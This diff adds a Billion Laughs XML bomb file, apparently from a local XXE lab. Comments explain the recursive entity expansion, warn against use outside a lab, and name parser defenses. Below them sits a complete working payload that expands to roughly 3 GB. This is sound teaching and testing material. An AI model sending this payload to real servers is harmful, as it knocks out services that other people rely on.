@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  XXE ATTACK FILE #3 - Billion Laughs (XML Bomb / DoS)
+  ======================================================
+  This is a Denial-of-Service attack, NOT a file-read attack.
+  It exploits recursive entity expansion to exhaust server memory.
+
+  HOW IT WORKS:
+  - "lol1" expands to 10x "lol"          (~30 bytes)
+  - "lol2" expands to 10x "lol1"         (~300 bytes)
+  - "lol3" expands to 10x "lol2"         (~3 KB)
+  - "lol4" expands to 10x "lol3"         (~30 KB)
+  - "lol5" expands to 10x "lol4"         (~300 KB)
+  - "lol6" expands to 10x "lol5"         (~3 MB)
+  - "lol7" expands to 10x "lol6"         (~30 MB)
+  - "lol8" expands to 10x "lol7"         (~300 MB)
+  - "lol9" expands to 10x "lol8"         (~3 GB) ← server runs out of memory
+
+  WARNING: Sending this to a truly vulnerable server may crash it.
+  Use only in a controlled lab environment.
+
+  DEFENSE: defusedxml and lxml's forbid_entities=True both block this.
+
+  See the home page at http://localhost:8000 for the curl and PowerShell commands.
+-->
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
